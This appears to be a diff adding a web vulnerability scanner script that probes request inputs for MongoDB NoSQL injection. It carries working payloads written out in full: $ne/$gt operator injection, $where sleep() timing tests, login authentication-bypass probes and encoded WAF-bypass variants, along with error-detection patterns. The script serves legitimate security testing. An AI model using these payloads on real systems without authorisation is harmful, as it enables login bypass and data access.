@@ -1,0 +1,485 @@
+#include constants.inc;
+#include helpers.inc;
+#include error_messages_helpers.inc;
+
+var targetUrl = new TURL(scanURL.url);
+var scheme = getCurrentScheme();
+targetUrl.path = scheme.path;
+targetUrl.getVar = "";
+
+{
+    function NoSQLErrorPatterns() {
+        this.plainArray = [
+            'MongoError:',
+            'MongoCursorException:',
+            'MongoCursorException: invalid operator:',
+            'MongoCursorException: $where compile error',
+            'MongoServerError:',
+            'BadValue Unknown operator:',
+            'unknown operator:',
+            'unknown top level operator:',
+            'MongoError: unknown operator',
+            'SyntaxError: Unexpected token',
+            'Cast to string failed',
+            'CastError:',
+            'can\'t have . in field names',
+            'illegal operator',
+            'unrecognized expression',
+            'path collision',
+            'Unrecognized pipeline stage name',
+            '$err',
+            'errmsg'
+        ];
+        this.regexArray = [
+            /MongoError:.*?failed/,
+            /\$where.*?error/i,
+            /unknown\s+operator.*?\$/,
+            /can't canonicalize query:.*?\$/,
+            /BadValue.*?\$/
+        ];
+    }
+
+    NoSQLErrorPatterns.prototype.searchOnText = function(text) {
+        for (var i = 0; i < this.plainArray.length; i++) {
+            if (text.indexOf(this.plainArray[i]) != -1) return this.plainArray[i];
+        }
+        for (var i = 0; i < this.regexArray.length; i++) {
+            var m = this.regexArray[i].exec(text);
+            if (m) return m[0];
+        }
+        return false;
+    };
+}
+var errorPatterns = new NoSQLErrorPatterns();
+
+{ // class for advanced NoSQL injection testing
+    function classNoSQLAdvanced(scheme, inputIndex) {
+        this.scheme = scheme;
+        this.inputIndex = inputIndex;
+        this.variations = scheme.selectVariationsForInput(inputIndex);
+        this.currentVariation = 0;
+        this.foundVulnOnVariation = false;
+        this.lastJob = null;
+        this.baselineBody = "";
+        this.baselineStatus = 0;
+        this.baselineLength = 0;
+    }
+
+    classNoSQLAdvanced.prototype.request = function(value) {
+        this.scheme.loadVariation(this.variations.item(this.currentVariation));
+        this.scheme.setInputValue(this.inputIndex, value);
+        this.lastJob = new THTTPJob();
+        this.lastJob.url = targetUrl;
+        scheme.populateRequest(this.lastJob);
+        this.lastJob.execute();
+        return ((!this.lastJob.wasError || (this.lastJob.wasError && this.lastJob.errorCode == 0xF0003)));
+    };
+
+    classNoSQLAdvanced.prototype.requestWithName = function(inputName, value) {
+        this.scheme.loadVariation(this.variations.item(this.currentVariation));
+        this.scheme.setTempInputName(this.inputIndex, inputName);
+        this.scheme.setInputValue(this.inputIndex, value);
+        this.lastJob = new THTTPJob();
+        this.lastJob.url = targetUrl;
+        scheme.populateRequest(this.lastJob);
+        this.lastJob.execute();
+        return ((!this.lastJob.wasError || (this.lastJob.wasError && this.lastJob.errorCode == 0xF0003)));
+    };
+
+    classNoSQLAdvanced.prototype.requestRaw = function(path, body, method, contentType) {
+        this.lastJob = new THTTPJob();
+        this.lastJob.url = targetUrl;
+        this.lastJob.URI = path;
+        this.lastJob.verb = method || "POST";
+        this.lastJob.postData = body;
+        this.lastJob.request.addHeader("Content-Type", contentType || "application/json");
+        this.lastJob.execute();
+        return (!this.lastJob.wasError);
+    };
+
+    classNoSQLAdvanced.prototype.alert = function(testValue, details) {
+        this.foundVulnOnVariation = true;
+        var ri = new TReportItem();
+        ri.LoadFromFile("MongoDB_injection.xml");
+        ri.affects = this.scheme.path;
+        ri.alertPath = "Scripts/NoSQL Injection Advanced";
+        ri.parameter = this.scheme.getInputName(this.inputIndex);
+        ri.parameterValue = testValue;
+        ri.setHttpInfo(this.lastJob);
+        ri.name = "NoSQL Injection (Advanced)";
+        ri.details = this.scheme.getInputTypeStr(this.inputIndex) +
+            " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) +
+            "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]";
+        if (details) {
+            ri.Details = ri.Details + "[break]" + details;
+        }
+        AddReportItem(ri);
+    };
+
+    classNoSQLAdvanced.prototype.getOrigValue = function() {
+        var value = "";
+        for (var i = 0; i < this.variations.count; i++) {
+            var varValue = this.scheme.getVariation(this.variations.item(i)).item(this.inputIndex);
+            if (value == "" && varValue != "") {
+                value = varValue;
+                break;
+            }
+        }
+        return value;
+    };
+
+    // Capture baseline response for comparison
+    classNoSQLAdvanced.prototype.captureBaseline = function() {
+        var origValue = this.getOrigValue();
+        if (!this.request(origValue)) return false;
+        this.baselineBody = this.lastJob.response.body;
+        this.baselineStatus = this.lastJob.response.msg2;
+        this.baselineLength = this.baselineBody.length;
+        return true;
+    };
+
+    // Check if response is meaningfully different from baseline
+    classNoSQLAdvanced.prototype.isDifferentFromBaseline = function(body, status) {
+        if (status != this.baselineStatus) return true;
+        var lengthDiff = Math.abs(body.length - this.baselineLength);
+        // Require at least 5% or 50 chars difference to avoid noise
+        if (lengthDiff > 50 && lengthDiff > (this.baselineLength * 0.05)) return true;
+        return false;
+    };
+
+    // Check if two responses are similar to each other
+    classNoSQLAdvanced.prototype.areSimilar = function(body1, status1, body2, status2) {
+        if (status1 != status2) return false;
+        var lengthDiff = Math.abs(body1.length - body2.length);
+        if (lengthDiff < 50 || lengthDiff < (Math.max(body1.length, body2.length) * 0.05)) return true;
+        return false;
+    };
+
+    // ---- Error-based NoSQL injection ----
+    classNoSQLAdvanced.prototype.testErrorBased = function() {
+        var inputName = this.scheme.getInputName(this.inputIndex);
+
+        // Test 1: Array operator injection via renamed parameter: param[$ne]=1
+        var operators = ['$ne', '$gt', '$lt', '$gte', '$lte', '$nin', '$exists', '$regex', '$where', '$or'];
+        var opValues = ['1', '', '', '', '', '1', 'true', '.*', '1', '1'];
+
+        for (var k = 0; k < operators.length; k++) {
+            var opName = inputName + '[' + operators[k] + ']';
+            if (!this.requestWithName(opName, opValues[k])) continue;
+
+            var matchedText = errorPatterns.searchOnText(this.lastJob.response.body);
+            if (matchedText) {
+                this.alert(opName + '=' + opValues[k],
+                    "Error-based NoSQL injection detected.[break]" +
+                    "Operator [bold]" + operators[k] + "[/bold] triggered an error.[break]" +
+                    "Error message: [pre][blue]" + matchedText + "[/blue][/pre]");
+                return true;
+            }
+        }
+
+        // Test 2: $where compile error with quote injection
+        if (this.request("'\"\\;{}()")) {
+            var matchedText = errorPatterns.searchOnText(this.lastJob.response.body);
+            if (matchedText) {
+                // Confirm: normal value should not trigger error
+                if (this.request(this.getOrigValue())) {
+                    var confirmMatch = errorPatterns.searchOnText(this.lastJob.response.body);
+                    if (!confirmMatch) {
+                        this.alert("'\"\\;{}()",
+                            "Error-based NoSQL injection via quote characters.[break]" +
+                            "Error message: [pre][blue]" + matchedText + "[/blue][/pre]");
+                        return true;
+                    }
+                }
+            }
+        }
+
+        // Test 3: URL-encoded operator bypass: %24ne
+        var bypassName = inputName + '[%24ne]';
+        if (this.requestWithName(bypassName, '1')) {
+            var matchedText = errorPatterns.searchOnText(this.lastJob.response.body);
+            if (matchedText) {
+                this.alert(bypassName + '=1',
+                    "Error-based NoSQL injection via URL-encoded operator (%24ne).[break]" +
+                    "Error message: [pre][blue]" + matchedText + "[/blue][/pre]");
+                return true;
+            }
+        }
+
+        return false;
+    };
+
+    // ---- Blind boolean-based NoSQL injection ----
+    classNoSQLAdvanced.prototype.testBlindBoolean = function() {
+        var inputName = this.scheme.getInputName(this.inputIndex);
+
+        // Test: $ne:"" (should match all docs) vs $eq:"NONEXISTENT_VALUE_xyzzy99"
+        // Step 1: Send always-true condition via param[$ne]=
+        var trueName = inputName + '[$ne]';
+        if (!this.requestWithName(trueName, '')) return false;
+        var trueBody = this.lastJob.response.body;
+        var trueStatus = this.lastJob.response.msg2;
+        var trueLength = trueBody.length;
+
+        // Step 2: Send always-false condition via param[$eq]=NONEXISTENT_xyzzy99
+        var falseName = inputName + '[$eq]';
+        var falseValue = 'NONEXISTENT_VALUE_' + randStr(8);
+        if (!this.requestWithName(falseName, falseValue)) return false;
+        var falseBody = this.lastJob.response.body;
+        var falseStatus = this.lastJob.response.msg2;
+        var falseLength = falseBody.length;
+
+        // Both must succeed but produce different results
+        var lengthDiff = Math.abs(trueLength - falseLength);
+        if (lengthDiff < 50 && trueStatus == falseStatus) return false;
+
+        // Step 3: Confirm with a second always-true condition: param[$gt]=
+        var confirmTrueName = inputName + '[$gt]';
+        if (!this.requestWithName(confirmTrueName, '')) return false;
+        var confirmTrueBody = this.lastJob.response.body;
+        var confirmTrueStatus = this.lastJob.response.msg2;
+
+        // The confirm-true response should be similar to the first true response
+        if (!this.areSimilar(trueBody, trueStatus, confirmTrueBody, confirmTrueStatus)) return false;
+
+        // And still different from the false response
+        if (this.areSimilar(confirmTrueBody, confirmTrueStatus, falseBody, falseStatus)) return false;
+
+        // Step 4: Second false confirmation: param[$gt]=zzzzzzzzzzzzzzzzzzzzz
+        if (!this.requestWithName(inputName + '[$gt]', 'zzzzzzzzzzzzzzzzzzzzzzzzzzzzz')) return false;
+        var confirmFalseBody = this.lastJob.response.body;
+        var confirmFalseStatus = this.lastJob.response.msg2;
+
+        // False confirmation must be similar to first false
+        if (!this.areSimilar(falseBody, falseStatus, confirmFalseBody, confirmFalseStatus)) return false;
+        // And different from true
+        if (this.areSimilar(confirmFalseBody, confirmFalseStatus, trueBody, trueStatus)) return false;
+
+        this.alert(trueName + '=',
+            "Blind boolean-based NoSQL injection detected.[break]" +
+            "Always-true condition ([bold]" + trueName + "=[/bold]) returned " + trueLength + " bytes (status " + trueStatus + ").[break]" +
+            "Always-false condition ([bold]" + falseName + "=" + falseValue + "[/bold]) returned " + falseLength + " bytes (status " + falseStatus + ").[break]" +
+            "Confirmed with secondary true/false payloads showing consistent differential response.");
+        return true;
+    };
+
+    // ---- Blind time-based via $where with sleep ----
+    classNoSQLAdvanced.prototype.testBlindTimeBased = function() {
+        var SLEEP_MS = 3000;
+        var THRESHOLD = 2500;
+
+        // Test $where with sleep function via JSON body
+        var sleepPayload = '{"$where":"sleep(' + SLEEP_MS + ')"}';
+        if (!this.requestRaw(this.scheme.path, sleepPayload, "POST")) return false;
+        var sleepDuration = this.lastJob.responseDuration;
+        if (sleepDuration < THRESHOLD) return false;
+
+        // Confirm: no-sleep request should be fast
+        var noSleepPayload = '{"$where":"1"}';
+        if (!this.requestRaw(this.scheme.path, noSleepPayload, "POST")) return false;
+        var noSleepDuration = this.lastJob.responseDuration;
+        if (noSleepDuration >= THRESHOLD) return false;
+
+        // Second confirmation: different sleep value
+        var SLEEP_MS2 = 5000;
+        var THRESHOLD2 = 4500;
+        var sleepPayload2 = '{"$where":"sleep(' + SLEEP_MS2 + ')"}';
+        if (!this.requestRaw(this.scheme.path, sleepPayload2, "POST")) return false;
+        var sleepDuration2 = this.lastJob.responseDuration;
+        if (sleepDuration2 < THRESHOLD2) return false;
+
+        // Longer sleep should take longer
+        if (sleepDuration2 <= sleepDuration) return false;
+
+        this.alert(sleepPayload,
+            "Blind time-based NoSQL injection via $where with sleep().[break]" +
+            "sleep(" + SLEEP_MS + ") => [bold]" + sleepDuration + " ms[/bold][break]" +
+            "no-sleep => [bold]" + noSleepDuration + " ms[/bold][break]" +
+            "sleep(" + SLEEP_MS2 + ") => [bold]" + sleepDuration2 + " ms[/bold][break]" +
+            "Response times correlate with injected sleep durations.");
+        return true;
+    };
+
+    // ---- Authentication bypass pattern ----
+    classNoSQLAdvanced.prototype.testAuthBypass = function() {
+        var inputName = this.scheme.getInputName(this.inputIndex).toLowerCase();
+
+        // Only test on inputs that look like auth-related fields
+        var authFields = ['user', 'username', 'login', 'email', 'password', 'pass', 'passwd', 'pwd'];
+        var isAuthField = false;
+        for (var k = 0; k < authFields.length; k++) {
+            if (inputName.indexOf(authFields[k]) != -1) {
+                isAuthField = true;
+                break;
+            }
+        }
+        if (!isAuthField) return false;
+
+        // Step 1: Baseline with normal value
+        var origValue = this.getOrigValue();
+        if (!this.request(origValue)) return false;
+        var normalStatus = this.lastJob.response.msg2;
+        var normalBody = this.lastJob.response.body;
+
+        // Step 2: Try operator injection via param[$ne]=
+        var bypassName = this.scheme.getInputName(this.inputIndex) + '[$ne]';
+        if (!this.requestWithName(bypassName, '')) return false;
+        var bypassStatus = this.lastJob.response.msg2;
+        var bypassBody = this.lastJob.response.body;
+
+        // Step 3: Check for authentication bypass indicators
+        // Status change from 401/403 to 200/302 is a strong indicator
+        var statusBypass = ((normalStatus == 401 || normalStatus == 403) &&
+                           (bypassStatus == 200 || bypassStatus == 302));
+
+        // Or significant content difference (got more data back)
+        var contentBypass = (bypassBody.length > normalBody.length + 100) &&
+                           (bypassStatus == 200 || bypassStatus == 302);
+
+        if (!statusBypass && !contentBypass) return false;
+
+        // Step 4: Confirm - param[$eq]=NONEXISTENT should NOT bypass
+        var noBypassName = this.scheme.getInputName(this.inputIndex) + '[$eq]';
+        var noBypassValue = 'NONEXISTENT_USER_' + randStr(10);
+        if (!this.requestWithName(noBypassName, noBypassValue)) return false;
+        var noBypassStatus = this.lastJob.response.msg2;
+        var noBypassBody = this.lastJob.response.body;
+
+        // Confirmation must return a non-bypass response
+        if (statusBypass && (noBypassStatus == 200 || noBypassStatus == 302)) return false;
+        if (contentBypass && noBypassBody.length > normalBody.length + 100) return false;
+
+        this.alert(bypassName + '=',
+            "NoSQL authentication bypass detected.[break]" +
+            "Normal request: status [bold]" + normalStatus + "[/bold], " + normalBody.length + " bytes.[break]" +
+            "Bypass request (" + bypassName + "=): status [bold]" + bypassStatus + "[/bold], " + bypassBody.length + " bytes.[break]" +
+            "Confirmation ($eq=NONEXISTENT): status [bold]" + noBypassStatus + "[/bold], " + noBypassBody.length + " bytes.[break]" +
+            "The $ne operator bypasses the equality check, returning all non-empty matches.");
+        return true;
+    };
+
+    // ---- JSON body NoSQL injection ----
+    classNoSQLAdvanced.prototype.testJSONBody = function() {
+        var inputName = this.scheme.getInputName(this.inputIndex);
+        var origValue = this.getOrigValue();
+
+        // Test: inject $ne operator in JSON body
+        // Build: {"paramName":{"$ne":""}}
+        var truePayload = '{"' + inputName + '":{"$ne":""}}';
+        if (!this.requestRaw(this.scheme.path, truePayload, "POST")) return false;
+        var trueBody = this.lastJob.response.body;
+        var trueStatus = this.lastJob.response.msg2;
+
+        // Error in response is also a finding
+        var matchedText = errorPatterns.searchOnText(trueBody);
+        if (matchedText) {
+            // Confirm normal JSON doesn't error
+            var normalPayload = '{"' + inputName + '":"' + origValue + '"}';
+            if (this.requestRaw(this.scheme.path, normalPayload, "POST")) {
+                if (!errorPatterns.searchOnText(this.lastJob.response.body)) {
+                    this.alert(truePayload,
+                        "NoSQL injection via JSON body operator.[break]" +
+                        "Error message: [pre][blue]" + matchedText + "[/blue][/pre]");
+                    return true;
+                }
+            }
+        }
+
+        // Blind boolean via JSON body
+        var falsePayload = '{"' + inputName + '":{"$eq":"NONEXISTENT_' + randStr(8) + '"}}';
+        if (!this.requestRaw(this.scheme.path, falsePayload, "POST")) return false;
+        var falseBody = this.lastJob.response.body;
+        var falseStatus = this.lastJob.response.msg2;
+
+        var lengthDiff = Math.abs(trueBody.length - falseBody.length);
+        if (lengthDiff < 50 && trueStatus == falseStatus) return false;
+
+        // Confirm with $regex
+        var confirmPayload = '{"' + inputName + '":{"$regex":".*"}}';
+        if (!this.requestRaw(this.scheme.path, confirmPayload, "POST")) return false;
+        var confirmBody = this.lastJob.response.body;
+        var confirmStatus = this.lastJob.response.msg2;
+
+        if (!this.areSimilar(trueBody, trueStatus, confirmBody, confirmStatus)) return false;
+        if (this.areSimilar(confirmBody, confirmStatus, falseBody, falseStatus)) return false;
+
+        this.alert(truePayload,
+            "Blind NoSQL injection via JSON body.[break]" +
+            "True payload ({\"$ne\":\"\"}): " + trueBody.length + " bytes (status " + trueStatus + ").[break]" +
+            "False payload ({\"$eq\":\"NONEXISTENT\"}): " + falseBody.length + " bytes (status " + falseStatus + ").[break]" +
+            "Confirmed with $regex operator showing consistent differential response.");
+        return true;
+    };
+
+    // ---- WAF / CF bypass payloads ----
+    classNoSQLAdvanced.prototype.testWAFBypass = function() {
+        var inputName = this.scheme.getInputName(this.inputIndex);
+
+        // Unicode escaped operator: $ne
+        var unicodeName = inputName + '[\\u0024ne]';
+        if (this.requestWithName(unicodeName, '1')) {
+            var matchedText = errorPatterns.searchOnText(this.lastJob.response.body);
+            if (matchedText) {
+                this.alert(unicodeName + '=1',
+                    "NoSQL injection via Unicode-escaped operator (WAF bypass).[break]" +
+                    "Error message: [pre][blue]" + matchedText + "[/blue][/pre]");
+                return true;
+            }
+        }
+
+        // Double URL-encoded: %2524ne
+        var doubleEncName = inputName + '[%2524ne]';
+        if (this.requestWithName(doubleEncName, '1')) {
+            var matchedText = errorPatterns.searchOnText(this.lastJob.response.body);
+            if (matchedText) {
+                this.alert(doubleEncName + '=1',
+                    "NoSQL injection via double URL-encoded operator (WAF bypass).[break]" +
+                    "Error message: [pre][blue]" + matchedText + "[/blue][/pre]");
+                return true;
+            }
+        }
+
+        // Dot notation: param.$ne
+        var dotName = inputName + '.$ne';
+        if (this.requestWithName(dotName, '1')) {
+            var matchedText = errorPatterns.searchOnText(this.lastJob.response.body);
+            if (matchedText) {
+                this.alert(dotName + '=1',
+                    "NoSQL injection via dot notation operator (WAF bypass).[break]" +
+                    "Error message: [pre][blue]" + matchedText + "[/blue][/pre]");
+                return true;
+            }
+        }
+
+        return false;
+    };
+
+    classNoSQLAdvanced.prototype.startTesting = function() {
+        for (var v = 0; v < this.variations.count; v++) {
+            if (this.foundVulnOnVariation) break;
+            this.currentVariation = v;
+            this.scheme.loadVariation(this.variations.item(v));
+
+            // Capture baseline for comparison
+            if (!this.captureBaseline()) continue;
+
+            // Run test categories in order of reliability
+            if (this.testErrorBased()) continue;
+            if (this.testBlindBoolean()) continue;
+            if (this.testAuthBypass()) continue;
+            if (this.testJSONBody()) continue;
+            if (this.testBlindTimeBased()) continue;
+            if (this.testWAFBypass()) continue;
+        }
+    };
+}
+
+// main entry point
+for (var i = 0; i < scheme.inputCount; i++) {
+    if (scheme.inputHasFlag(i, INPUT_FLAG_CAN_BE_ARRAY)) {
+        var tester = new classNoSQLAdvanced(scheme, i);
+        tester.startTesting();
+        ScriptProgress(ComputeProgress(i, scheme.inputCount));
+        tester = null;
+    }
+}
